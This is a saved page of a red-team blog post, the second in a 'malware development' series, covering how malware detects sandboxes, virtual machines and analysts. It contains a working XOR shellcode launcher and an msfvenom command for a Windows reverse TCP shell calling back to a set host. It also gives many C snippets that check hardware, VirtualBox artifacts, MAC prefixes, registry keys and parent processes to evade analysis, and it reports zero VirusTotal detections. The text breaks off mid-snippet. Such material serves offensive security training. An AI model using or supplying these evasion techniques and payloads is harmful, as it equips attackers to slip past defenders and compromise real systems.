<!DOCTYPE html>
<html><head>
    <title>Malware development part 2 – 0xPat blog – Red/purple teamer</title>

        <meta charset="utf-8">
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

    
    <meta name="description" content="Introduction
This is the second post of a series which regards development of malicious software. In this series we will explore and try to implement multiple techniques used by malicious applications to execute code, hide from defenses and persist.
Previously, we’ve created basic Metasploit shellcode launcher in C++ and explored basic techniques which helped to lower detection rate of the compiled executable - payload encoding/encryption, binary signing with custom code-signing certificate and switching to x64 architecture.
Now let’s dive deep into dynamic analysis and how to defend against it.

">
    <meta property="og:description" content="Introduction
This is the second post of a series which regards development of malicious software. In this series we will explore and try to implement multiple techniques used by malicious applications to execute code, hide from defenses and persist.
Previously, we’ve created basic Metasploit shellcode launcher in C++ and explored basic techniques which helped to lower detection rate of the compiled executable - payload encoding/encryption, binary signing with custom code-signing certificate and switching to x64 architecture.
Now let’s dive deep into dynamic analysis and how to defend against it.

">
    
    <meta name="author" content="0xPat blog">

    
    <meta property="og:title" content="Malware development part 2">
    <meta property="twitter:title" content="Malware development part 2">
    

    <!--[if lt IE 9]>
      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link rel="stylesheet" type="text/css" href="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/style.css">
    <link rel="alternate" type="application/rss+xml" title="0xPat blog - Red/purple teamer" href="https://0xpat.github.io/feed.xml">

  </head>

  <body>
    <div class="wrapper-masthead">
      <div class="container">
        <header class="masthead clearfix">
          
          <div class="site-info">
            <h1 class="site-name"><a href="https://0xpat.github.io/">0xPat blog</a></h1>
            <p class="site-description">Red/purple teamer</p>
          </div>

          <nav>
            <a href="https://0xpat.github.io/">Blog</a>
            <a href="https://0xpat.github.io/about">About</a>
          </nav>
        </header>
      </div>
    </div>

    <div id="main" role="main" class="container">
      <article class="post">
  <h1>Malware development part 2</h1>

  <div class="entry">
    <h2 id="introduction">Introduction</h2>
<p>This is the second post of a series which regards development of 
malicious software. In this series we will explore and try to implement 
multiple techniques used by malicious applications to execute code, hide
 from defenses and persist.<br>
Previously, we’ve created basic Metasploit shellcode launcher in C++ and
 explored basic techniques which helped to lower detection rate of the 
compiled executable - payload encoding/encryption, binary signing with 
custom code-signing certificate and switching to x64 architecture.<br>
Now let’s dive deep into dynamic analysis and how to defend against it.</p>

<p>Note: we assume 64-bit execution environment - some code samples may 
not work for x86 applications (for example due to hardcoded 8-byte 
pointer length or different data layout in PE and PEB). Also, error 
checks and cleanups are ommited in the code samples below.</p>

<h2 id="dynamic-analysis-of-malware">Dynamic analysis of malware</h2>
<p>Dynamic analysis of an executable may be performed either 
automatically by a sandbox or manually by an analyst. Malicious 
applications often use various methods to fingerprint the environment 
they’re being executed in and perform different actions based on the 
situation.</p>

<p>Automated analysis is performed in a simplified sandbox environment 
which may have some specific traits, particularly it may not be able to 
emulate all nuances of the real environment. Manual analysis is usually 
 performed in a virtualized environment and specific additional tools 
may be encountered (debugger, other analytic software).</p>

<p>Both automated and manual analysis have common characteristics, in 
particular they are usually performed in a virtualized environment which
 can be easily detected if not configured (hardened) properly. Most 
sandbox/analysis detection techniques revolve around checking specific 
environment attributes (limited resources, indicative device names) and 
artifacts (presence of specific files, registry keys).</p>

<p>However there are several specific detections for automated sandboxes
 and other specific for virtual environments used by malware analysts.</p>

<h3 id="testing-detection">Testing detection</h3>
<p>We will use the piece of code from <a href="https://0xpat.github.io/Malware_development_part_1">Malware development part 1</a> which injects XOR-decrypted shellcode into newly allocated memory block and executes it:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">const</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xc9\x7d\xb6</span><span class="s"> (...) "</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">shellcode_exec</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="o">|</span><span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">);</span>
	<span class="n">DWORD</span> <span class="n">threadID</span><span class="p">;</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">)[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="sc">'\x35'</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">threadID</span><span class="p">);</span>
	<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>To bypass some static detections, the application targets x64 architecture and is signed with a custom certificate.</p>

<p>This time however we use reverse shell shellcode:</p>

<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.200.102 -f raw</code></p>

<p>We will check if the IP address of reverse shell handler (which is a 
very basic IoC in this case) will be extracted during dynamic analysis.</p>

<p>Using AV evasion techniques described in the previous article we get already low detection rate on VirusTotal:</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_check.png" alt="VT check"></p>

<p>Microsoft Defender detects the “Meterpreter trojan” (actually it’s 
just a reverse TCP shell, not a Meterpreter shell). VT sandbox is able 
to extract IP address during dynamic analysis.</p>

<p>Let’s start with generic techniques for dynamic analysis detection and bypassing.</p>

<h2 id="detecting-virtualized-environment">Detecting virtualized environment</h2>
<p>Both sandboxes and analyst’s virtualized OSes usually can’t 100% 
accurately emulate actual execution environment (like typical user 
workstation). Virtualized environments have limited resources 
(corresponding device names can also provide useful information), may 
have VM-specific tools and drivers installed, often look like a fresh 
Windows installation and sometimes use hardcoded user or computer names.
  We can take advantage of that.</p>

<h3 id="hardware-resources">Hardware resources</h3>
<p>The main problem are limited resources - a sandbox may not be able to
 run long and consuming simulations in parallel so is often restricts 
resources commited and time allocated for a single instance. Regular VM 
boxes used by analysts are also subject for same constraints - they 
often have their resources limited.</p>

<p>Typical user workstation has a processor with at least 2 cores, a 
minimum of 2 GB of RAM and a 100 GB hard drive. We can verify if the 
environment our malicious application is being executed in is a subject 
to these constrains:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// check CPU</span>
<span class="n">SYSTEM_INFO</span> <span class="n">systemInfo</span><span class="p">;</span>
<span class="n">GetSystemInfo</span><span class="p">(</span><span class="o">&amp;</span><span class="n">systemInfo</span><span class="p">);</span>
<span class="n">DWORD</span> <span class="n">numberOfProcessors</span> <span class="o">=</span> <span class="n">systemInfo</span><span class="p">.</span><span class="n">dwNumberOfProcessors</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">numberOfProcessors</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>

<span class="c1">// check RAM</span>
<span class="n">MEMORYSTATUSEX</span> <span class="n">memoryStatus</span><span class="p">;</span>
<span class="n">memoryStatus</span><span class="p">.</span><span class="n">dwLength</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">memoryStatus</span><span class="p">);</span>
<span class="n">GlobalMemoryStatusEx</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memoryStatus</span><span class="p">);</span>
<span class="n">DWORD</span> <span class="n">RAMMB</span> <span class="o">=</span> <span class="n">memoryStatus</span><span class="p">.</span><span class="n">ullTotalPhys</span> <span class="o">/</span> <span class="mi">1024</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">RAMMB</span> <span class="o">&lt;</span> <span class="mi">2048</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>

<span class="c1">// check HDD</span>
<span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileW</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">PhysicalDrive0"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">DISK_GEOMETRY</span> <span class="n">pDiskGeometry</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">bytesReturned</span><span class="p">;</span>
<span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_DISK_GET_DRIVE_GEOMETRY</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pDiskGeometry</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pDiskGeometry</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="p">(</span><span class="n">LPOVERLAPPED</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">DWORD</span> <span class="n">diskSizeGB</span><span class="p">;</span>
<span class="n">diskSizeGB</span> <span class="o">=</span> <span class="n">pDiskGeometry</span><span class="p">.</span><span class="n">Cylinders</span><span class="p">.</span><span class="n">QuadPart</span> <span class="o">*</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">pDiskGeometry</span><span class="p">.</span><span class="n">TracksPerCylinder</span> <span class="o">*</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">pDiskGeometry</span><span class="p">.</span><span class="n">SectorsPerTrack</span> <span class="o">*</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">pDiskGeometry</span><span class="p">.</span><span class="n">BytesPerSector</span> <span class="o">/</span> <span class="mi">1024</span> <span class="o">/</span> <span class="mi">1024</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">diskSizeGB</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>
<p>Using these simple checks we were able to drop the detection rate to zero:</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_hardware_check.png" alt="VT hardware check"></p>

<p>Dynamic analysis performed by VirusTotal sandbox didn’t provide any IPs (IoCs). That was easy :)</p>

<h3 id="devices-and-vendor-names">Devices and vendor names</h3>
<p>On default VM installations devices often have predictable names, for
 example containing strings associated with the specific hypervisor. We 
can check for hard drive name, optical disk drive name, BIOS version, 
computer manufacturer and model name, graphics controller name etc. 
Relevant information can be retrieved with WMI queries (check properties
 like “Name”, “Description”, “Caption”).</p>

<p>Below you can see an example of HDD name retrieval using native Windows API functions (without WMI):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HDEVINFO</span> <span class="n">hDeviceInfo</span> <span class="o">=</span> <span class="n">SetupDiGetClassDevs</span><span class="p">(</span><span class="o">&amp;</span><span class="n">GUID_DEVCLASS_DISKDRIVE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">DIGCF_PRESENT</span><span class="p">);</span>
<span class="n">SP_DEVINFO_DATA</span> <span class="n">deviceInfoData</span><span class="p">;</span>
<span class="n">deviceInfoData</span><span class="p">.</span><span class="n">cbSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SP_DEVINFO_DATA</span><span class="p">);</span>
<span class="n">SetupDiEnumDeviceInfo</span><span class="p">(</span><span class="n">hDeviceInfo</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">deviceInfoData</span><span class="p">);</span>
<span class="n">DWORD</span> <span class="n">propertyBufferSize</span><span class="p">;</span>
<span class="n">SetupDiGetDeviceRegistryPropertyW</span><span class="p">(</span><span class="n">hDeviceInfo</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">deviceInfoData</span><span class="p">,</span> <span class="n">SPDRP_FRIENDLYNAME</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">propertyBufferSize</span><span class="p">);</span>
<span class="n">PWSTR</span> <span class="n">HDDName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWSTR</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="n">propertyBufferSize</span><span class="p">);</span>
<span class="n">SetupDiGetDeviceRegistryPropertyW</span><span class="p">(</span><span class="n">hDeviceInfo</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">deviceInfoData</span><span class="p">,</span> <span class="n">SPDRP_FRIENDLYNAME</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">HDDName</span><span class="p">,</span> <span class="n">propertyBufferSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">CharUpperW</span><span class="p">(</span><span class="n">HDDName</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">HDDName</span><span class="p">,</span> <span class="s">L"VBOX"</span><span class="p">))</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<p>We can also look for specific virtual devices that would not be 
present in a typical host system, like pipes and other interfaces used 
for guest-host communication:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">OBJECT_ATTRIBUTES</span> <span class="n">objectAttributes</span><span class="p">;</span>
<span class="n">UNICODE_STRING</span> <span class="n">uDeviceName</span><span class="p">;</span>
<span class="n">RtlSecureZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">uDeviceName</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">uDeviceName</span><span class="p">));</span>
<span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">uDeviceName</span><span class="p">,</span> <span class="s">L"</span><span class="se">\\</span><span class="s">Device</span><span class="se">\\</span><span class="s">VBoxGuest"</span><span class="p">);</span> <span class="c1">// or pipe: L"\\??\\pipe\\VBoxTrayIPC-&lt;username&gt;"</span>
<span class="n">InitializeObjectAttributes</span><span class="p">(</span><span class="o">&amp;</span><span class="n">objectAttributes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uDeviceName</span><span class="p">,</span> <span class="n">OBJ_CASE_INSENSITIVE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">IO_STATUS_BLOCK</span> <span class="n">ioStatusBlock</span><span class="p">;</span>
<span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="n">NtCreateFile</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">objectAttributes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ioStatusBlock</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">FILE_OPEN</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">NT_SUCCESS</span><span class="p">(</span><span class="n">status</span><span class="p">))</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<p>We should also pay attention to network devices. Especially MAC 
addresses can indicate presence of a virtual environment since first 3 
bytes are manufacturer identificator by default. Let’s iterate all 
available network adapters and compare first bytes with well-known 
values:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">adaptersListSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">GetAdaptersAddresses</span><span class="p">(</span><span class="n">AF_UNSPEC</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">adaptersListSize</span><span class="p">);</span>
<span class="n">IP_ADAPTER_ADDRESSES</span><span class="o">*</span> <span class="n">pAdaptersAddresses</span> <span class="o">=</span> <span class="p">(</span><span class="n">IP_ADAPTER_ADDRESSES</span><span class="o">*</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="n">adaptersListSize</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">pAdaptersAddresses</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">GetAdaptersAddresses</span><span class="p">(</span><span class="n">AF_UNSPEC</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pAdaptersAddresses</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">adaptersListSize</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">mac</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
	<span class="k">while</span> <span class="p">(</span><span class="n">pAdaptersAddresses</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">pAdaptersAddresses</span><span class="o">-&gt;</span><span class="n">PhysicalAddressLength</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">memcpy</span><span class="p">(</span><span class="n">mac</span><span class="p">,</span> <span class="n">pAdaptersAddresses</span><span class="o">-&gt;</span><span class="n">PhysicalAddress</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">({</span> <span class="s">"</span><span class="se">\x08\x00\x27</span><span class="s">"</span> <span class="p">},</span> <span class="n">mac</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="n">pAdaptersAddresses</span> <span class="o">=</span> <span class="n">pAdaptersAddresses</span><span class="o">-&gt;</span><span class="n">Next</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="vm-specific-artifacts">VM-specific artifacts</h3>
<p>There are also specific artifacts present on virtualized environments
 - files and registry entries indicating presence of a hypervisor. We 
can check for files and directories associated with drivers, devices and
 modules provided by the hypervisor and registry keys and values 
containing configurations or hardware description.</p>

<p>List of directories worth checking for these artifacts include <code class="language-plaintext highlighter-rouge">C:\Windows\System32</code> and <code class="language-plaintext highlighter-rouge">C:\Windows\System32\Drivers</code>. Interesting registry keys are <code class="language-plaintext highlighter-rouge">HKLM\SYSTEM\ControlSet001\Services</code>, <code class="language-plaintext highlighter-rouge">HKLM\HARDWARE\Description\System</code>, <code class="language-plaintext highlighter-rouge">HKLM\SYSTEM\CurrentControlSet\Control\SystemInformation</code> and others.</p>

<p>Below is the example code for probing VirtualBox-specific file and registry key:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// check files</span>
<span class="n">WIN32_FIND_DATAW</span> <span class="n">findFileData</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">FindFirstFileW</span><span class="p">(</span><span class="s">L"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">VBox*.dll"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">findFileData</span><span class="p">)</span> <span class="o">!=</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>

<span class="c1">// check registry key</span>
<span class="n">HKEY</span> <span class="n">hkResult</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">RegOpenKeyExW</span><span class="p">(</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span> <span class="s">L"SYSTEM</span><span class="se">\\</span><span class="s">ControlSet001</span><span class="se">\\</span><span class="s">Services</span><span class="se">\\</span><span class="s">VBoxSF"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">KEY_QUERY_VALUE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hkResult</span><span class="p">)</span> <span class="o">==</span> <span class="n">ERROR_SUCCESS</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<h3 id="file-directory-process-and-window-names">File, directory, process and window names</h3>

<p>These methods can be used to detect sandbox, virtual machine, 
debugger or manual analysis environment in general. There are specific 
applications (and associated process and window names and loaded 
libraries) that should not be used by a regular user.</p>

<h4 id="application-name-and-directory">Application name and directory</h4>

<p>Names of binaries analyzed in sandboxes are sometimes changed to generic ones like for example <code class="language-plaintext highlighter-rouge">sample.exe</code>.
 Malware analysts may also rename the file before executing. We can 
check if file or directory name contains “suspicious” character strings.
 However when we are certain about the name and the path of the 
executable (e.g. when it is dropped by VBA macro) we can verify if it is
 indeed executed from assumed location:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">wchar_t</span> <span class="n">currentProcessPath</span><span class="p">[</span><span class="n">MAX_PATH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
<span class="n">GetModuleFileNameW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">currentProcessPath</span><span class="p">,</span> <span class="n">MAX_PATH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
<span class="n">CharUpperW</span><span class="p">(</span><span class="n">currentProcessPath</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">currentProcessPath</span><span class="p">,</span> <span class="s">L"C:</span><span class="se">\\</span><span class="s">USERS</span><span class="se">\\</span><span class="s">PUBLIC</span><span class="se">\\</span><span class="s">"</span><span class="p">))</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">currentProcessPath</span><span class="p">,</span> <span class="s">L"MALWARE.EXE"</span><span class="p">))</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<h4 id="parent-process">Parent process</h4>

<p>Sometimes we can assume that the application should be started by a specific process, like <code class="language-plaintext highlighter-rouge">explorere.exe</code> or <code class="language-plaintext highlighter-rouge">svchost.exe</code>. Or that it should not be started by for example a debugger. We can put a condition based on the parent process name:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="nf">GetParentPID</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">pid</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">DWORD</span> <span class="n">ppid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">PROCESSENTRY32W</span> <span class="n">processEntry</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
	<span class="n">processEntry</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32W</span><span class="p">);</span>
	<span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">Process32FirstW</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">processEntry</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="k">do</span>
		<span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">processEntry</span><span class="p">.</span><span class="n">th32ProcessID</span> <span class="o">==</span> <span class="n">pid</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="n">ppid</span> <span class="o">=</span> <span class="n">processEntry</span><span class="p">.</span><span class="n">th32ParentProcessID</span><span class="p">;</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32NextW</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">processEntry</span><span class="p">));</span>
	<span class="p">}</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">ppid</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">DWORD</span> <span class="n">parentPid</span> <span class="o">=</span> <span class="n">GetParentPID</span><span class="p">(</span><span class="n">GetCurrentProcessId</span><span class="p">());</span>
	<span class="n">WCHAR</span> <span class="n">parentName</span><span class="p">[</span><span class="n">MAX_PATH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
	<span class="n">DWORD</span> <span class="n">dwParentName</span> <span class="o">=</span> <span class="n">MAX_PATH</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hParent</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_QUERY_INFORMATION</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">parentPid</span><span class="p">);</span>
	<span class="n">QueryFullProcessImageNameW</span><span class="p">(</span><span class="n">hParent</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">parentName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwParentName</span><span class="p">);</span> <span class="c1">// another way to get process name is to use 'Toolhelp32Snapshot'</span>
	<span class="n">CharUpperW</span><span class="p">(</span><span class="n">parentName</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">parentName</span><span class="p">,</span> <span class="s">L"WINDBG.EXE"</span><span class="p">))</span> <span class="k">return</span><span class="p">;</span>

	<span class="n">wprintf_s</span><span class="p">(</span><span class="s">L"Now hacking...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="running-processes">Running processes</h4>

<p>We can enumerate all existing processes and check for typical analysis tools like <code class="language-plaintext highlighter-rouge">Wireshark</code>, <code class="language-plaintext highlighter-rouge">Procmon</code>, <code class="language-plaintext highlighter-rouge">x64dbg</code>, <code class="language-plaintext highlighter-rouge">IDA</code> etc.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PROCESSENTRY32W</span> <span class="n">processEntry</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
<span class="n">processEntry</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32W</span><span class="p">);</span>
